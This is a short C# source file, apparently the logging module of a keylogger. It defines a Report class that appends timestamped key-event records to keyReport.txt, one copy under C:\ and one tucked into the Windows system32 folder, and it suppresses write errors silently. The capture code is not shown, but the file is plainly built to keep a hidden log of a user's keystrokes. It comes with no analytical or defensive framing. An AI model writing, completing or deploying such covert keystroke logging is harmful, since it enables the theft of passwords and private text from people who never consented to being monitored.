using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System;
using System.IO;
namespace 记住
{
        public class Report
        {
                public Report()
                {
                }
                public void FirstWrite()
                {
                        StreamWriter sw = new StreamWriter("c:/windows/system32/keyReport.txt",true);
                        sw.WriteLine("************* LittleStudio Studio ************* ");
                        sw.WriteLine("********  " + DateTime.Today.Year.ToString() + "."
                                + DateTime.Today.Month.ToString() + "."
                                + DateTime.Today.Day.ToString() + "     "
                                + DateTime.Now.Hour.ToString() + ":"
                                + DateTime.Now.Minute.ToString() + ":"
                                + DateTime.Now.Second.ToString() + "  ********");
                        sw.Close();
                }
                public void WriteDate(string keyEvents,string keyDate)
                {
                        try
                        {
                                StreamWriter sw = new StreamWriter("c:/keyReport.txt",true);
                                sw.WriteLine(keyDate + "键  " + keyEvents + "   "
                                        + DateTime.Now.Hour.ToString() + ":"
                                        + DateTime.Now.Minute.ToString() + ":"
                                        + DateTime.Now.Second.ToString());
                                sw.Close();
                        }
                        catch{}
                        return;
                }

        }
}